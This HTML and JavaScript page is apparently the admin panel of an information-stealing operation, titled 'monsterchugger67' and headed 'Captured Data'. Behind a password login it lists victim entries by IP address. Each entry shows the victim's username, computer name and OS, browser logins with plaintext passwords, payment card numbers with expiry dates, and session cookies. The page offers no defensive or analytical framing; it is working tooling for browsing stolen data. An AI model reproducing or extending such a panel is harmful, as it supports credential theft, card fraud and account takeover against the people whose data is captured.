<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>monsterchugger67</title>
<style>
:root{--bg:#fff;--fg:#161616;--mut:#5f5f5f;--line:#e7e7e7;--soft:#f7f7f7}
@media(prefers-color-scheme:dark){:root{--bg:#0b0b0b;--fg:#ececec;--mut:#a3a3a3;--line:#242424;--soft:#131313}}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--fg);font:16px/1.7 -apple-system,BlinkMacSystemFont,"Inter","Segoe UI",sans-serif}
.wrap{max-width:1075px;margin:0 auto;padding:0 24px 100px}
.hero-row{position:relative;margin-top:32px}
.hero{border:1px solid var(--line);background:var(--soft);padding:56px 32px;margin-top:0;text-align:center;display:flex;flex-direction:column;align-items:center}
.eyebrow{display:inline-block;font-family:ui-monospace,Menlo,monospace;font-size:12.5px;color:var(--mut);border:1px solid var(--line);background:var(--bg);padding:6px 14px;margin-bottom:20px}
h1{font-size:clamp(30px,5vw,52px);line-height:1.08;letter-spacing:-1.5px;font-weight:800;margin:0 0 14px;max-width:820px}
.btn{display:inline-block;background:var(--fg);color:var(--bg);padding:12px 22px;border-radius:0;font-size:14.5px;font-weight:650;text-decoration:none;border:1px solid var(--fg);cursor:pointer}
.btn:hover{opacity:.9}
.error{color:#ff6b6b;margin-top:15px}
.login-form{display:flex;flex-direction:column;gap:12px;align-items:center;width:100%;max-width:400px;margin-top:30px}
.login-form input{width:100%;padding:12px;border:1px solid var(--line);background:var(--bg);color:var(--fg);font-size:16px;border-radius:0}
.login-form input:focus{outline:none;border-color:var(--fg)}
.dashboard{display:none}
.header{display:flex;justify-content:space-between;align-items:center;padding:20px 0;border-bottom:1px solid var(--line);margin-bottom:30px}
.logout-btn{background:transparent;border:1px solid var(--line);color:var(--mut);padding:8px 16px;cursor:pointer}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:12px;margin-bottom:30px}
.stat-card{border:1px solid var(--line);background:var(--soft);padding:20px;text-align:center}
.stat-card h3{color:var(--mut);font-size:14px;margin-bottom:10px;font-weight:400}
.stat-card .value{font-size:32px;font-weight:700;color:var(--fg)}
.data-table{width:100%;border-collapse:collapse;border:1px solid var(--line);background:var(--soft)}
.data-table th,.data-table td{padding:15px;text-align:left;border-bottom:1px solid var(--line)}
.data-table th{background:var(--bg);color:var(--fg);font-weight:600}
.data-table tr:hover{background:var(--bg)}
.view-btn{background:var(--fg);color:var(--bg);padding:8px 16px;border:1px solid var(--fg);cursor:pointer;font-size:13px}
.view-btn:hover{opacity:.9}
.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);justify-content:center;align-items:center;z-index:1000}
.modal-content{background:var(--bg);padding:30px;border-radius:0;max-width:90%;max-height:90%;overflow:auto;position:relative}
.modal-close{position:absolute;top:15px;right:15px;background:none;border:none;color:var(--fg);font-size:24px;cursor:pointer}
.data-display{background:var(--soft);border:1px solid var(--line);padding:20px;overflow-x:auto;white-space:pre-wrap;font-family:ui-monospace,Menlo,monospace;font-size:12px;color:var(--mut);max-height:500px;overflow-y:auto}
.section-title{color:var(--fg);margin:20px 0 10px 0;padding-bottom:5px;border-bottom:1px solid var(--line);font-weight:600}
.info-item{margin:5px 0;color:var(--mut);font-size:14px}
.info-item strong{color:var(--fg)}
.login-section{margin-top:40px}
.login-section h2{font-size:18px;margin-bottom:10px}
.login-section p{color:var(--mut);font-size:14px;margin-bottom:20px}
</style>
</head>
<body>
<div class="wrap">
<div class="hero-row">
<section class="hero" id="loginContainer">
<span class="eyebrow">Authentication Required</span>
<h1>Enter to continue</h1>
<form class="login-form" id="loginForm">
<input type="password" id="password" placeholder="Password" required autocomplete="off">
<button type="submit" class="btn">Enter</button>
<div class="error" id="loginError"></div>
</form>
</section>
</div>

<div class="dashboard" id="dashboard">
<div class="header">
<h1 style="font-size:24px">Captured Data</h1>
<button class="logout-btn" onclick="logout()">Logout</button>
</div>

<div class="stats">
<div class="stat-card">
<h3>Total Files</h3>
<div class="value" id="totalFiles">0</div>
</div>
<div class="stat-card">
<h3>Unique IPs</h3>
<div class="value" id="uniqueIPs">0</div>
</div>
<div class="stat-card">
<h3>Total Size</h3>
<div class="value" id="totalSize">0 KB</div>
</div>
</div>

<h2 style="font-size:18px;margin-bottom:20px">📁 Files</h2>
<table class="data-table">
<thead>
<tr>
<th>IP Address</th>
<th>Date</th>
<th>Size</th>
<th>Action</th>
</tr>
</thead>
<tbody id="dataTable"></tbody>
</table>
</div>
</div>

<div class="modal" id="dataModal">
<div class="modal-content">
<button class="modal-close" onclick="closeModal()">×</button>
<div id="modalBody"></div>
</div>
</div>

<script>
let authToken = localStorage.getItem('authToken');

function init(){
    if(authToken){
        checkAuth();
    }
}

async function checkAuth(){
    try{
        const res = await fetch('/api/admin',{
            headers:{'Authorization':`Bearer ${authToken}`}
        });
        const data = await res.json();
        if(data.authenticated){
            showDashboard();
            loadData();
        }else{
            localStorage.removeItem('authToken');
            authToken = null;
        }
    }catch(e){
        localStorage.removeItem('authToken');
        authToken = null;
    }
}

function showDashboard(){
    document.getElementById('loginContainer').style.display='none';
    document.getElementById('dashboard').style.display='block';
}

document.getElementById('loginForm').addEventListener('submit',async(e)=>{
    e.preventDefault();
    const password = document.getElementById('password').value;
    
    try{
        const res = await fetch('/api/login',{
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({password})
        });
        const data = await res.json();
        if(data.success){
            authToken = data.token;
            localStorage.setItem('authToken',authToken);
            showDashboard();
            loadData();
            document.getElementById('loginError').textContent='';
        }else{
            document.getElementById('loginError').textContent=data.message;
        }
    }catch(e){
        document.getElementById('loginError').textContent='Connection error';
    }
});

async function loadData(){
    try{
        const res = await fetch('/api/data',{
            headers:{'Authorization':`Bearer ${authToken}`}
        });
        if(!res.ok){
            localStorage.removeItem('authToken');
            window.location.reload();
            return;
        }
        const data = await res.json();
        const tbody = document.getElementById('dataTable');
        tbody.innerHTML='';
        const uniqueIPs = new Set();
        let totalSize = 0;
        
        data.files.forEach(file=>{
            uniqueIPs.add(file.ip);
            totalSize += file.size;
            const row = document.createElement('tr');
            row.innerHTML=`
                <td>${file.ip}</td>
                <td>${new Date(file.date).toLocaleString()}</td>
                <td>${(file.size/1024).toFixed(2)} KB</td>
                <td><button class="view-btn" onclick="viewData('${file.filename}')">View</button></td>
            `;
            tbody.appendChild(row);
        });
        
        document.getElementById('totalFiles').textContent=data.files.length;
        document.getElementById('uniqueIPs').textContent=uniqueIPs.size;
        document.getElementById('totalSize').textContent=`${(totalSize/1024).toFixed(2)} KB`;
    }catch(e){
        console.error('Error loading data:',e);
    }
}

async function viewData(filename){
    try{
        const res = await fetch(`/api/data/${filename}`,{
            headers:{'Authorization':`Bearer ${authToken}`}
        });
        const data = await res.json();
        const modalBody = document.getElementById('modalBody');
        
        if(data.data){
            const d = data.data;
            let html = '';
            html += '<h2 class="section-title">System Info</h2>';
            html += '<div class="info-item"><strong>Username:</strong> '+(d.system_info?.username||'N/A')+'</div>';
            html += '<div class="info-item"><strong>Computer:</strong> '+(d.system_info?.computer_name||'N/A')+'</div>';
            html += '<div class="info-item"><strong>OS:</strong> '+(d.system_info?.os||'N/A')+'</div>';
            html += '<div class="info-item"><strong>Timestamp:</strong> '+(d.timestamp||'N/A')+'</div>';
            
            if(d.browsers){
                for(const[browser,browserData]of Object.entries(d.browsers)){
                    html += `<h2 class="section-title">${browser.toUpperCase()}</h2>`;
                    if(browserData.logins&&browserData.logins.length>0){
                        html += '<h3 style="color:var(--fg);margin:15px 0 10px;font-size:14px">Logins ('+browserData.logins.length+')</h3>';
                        browserData.logins.forEach(login=>{
                            html += `<div style="border:1px solid var(--line);padding:10px;margin:5px 0;background:var(--bg)">`;
                            html += `<div class="info-item"><strong>URL:</strong> ${login.url||login.hostname||'N/A'}</div>`;
                            html += `<div class="info-item"><strong>Username:</strong> ${login.username||'N/A'}</div>`;
                            html += `<div class="info-item"><strong>Password:</strong> ${login.password||'N/A'}</div>`;
                            html += '</div>';
                        });
                    }
                    if(browserData.payments&&browserData.payments.length>0){
                        html += '<h3 style="color:var(--fg);margin:15px 0 10px;font-size:14px">Payment Cards ('+browserData.payments.length+')</h3>';
                        browserData.payments.forEach(card=>{
                            html += `<div style="border:1px solid var(--line);padding:10px;margin:5px 0;background:var(--bg)">`;
                            html += `<div class="info-item"><strong>Name:</strong> ${card.name||'N/A'}</div>`;
                            html += `<div class="info-item"><strong>Number:</strong> ${card.number||'N/A'}</div>`;
                            html += `<div class="info-item"><strong>Expiry:</strong> ${card.expiry||'N/A'}</div>`;
                            html += '</div>';
                        });
                    }
                    if(browserData.cookies&&browserData.cookies.length>0){
                        html += '<h3 style="color:var(--fg);margin:15px 0 10px;font-size:14px">Cookies ('+browserData.cookies.length+')</h3>';
                        html += '<div class="data-display">'+JSON.stringify(browserData.cookies,null,2)+'</div>';
                    }
                }
            }
            modalBody.innerHTML=html;
        }else{
            modalBody.innerHTML='<div class="data-display">'+JSON.stringify(data,null,2)+'</div>';
        }
        document.getElementById('dataModal').style.display='flex';
    }catch(e){
        alert('Error loading data: '+e.message);
    }
}

function closeModal(){
    document.getElementById('dataModal').style.display='none';
}

function logout(){
    localStorage.removeItem('authToken');
    window.location.reload();
}

document.getElementById('dataModal').addEventListener('click',(e)=>{
    if(e.target.id==='dataModal'){
        closeModal();
    }
});

init();
</script>
</body>
</html>
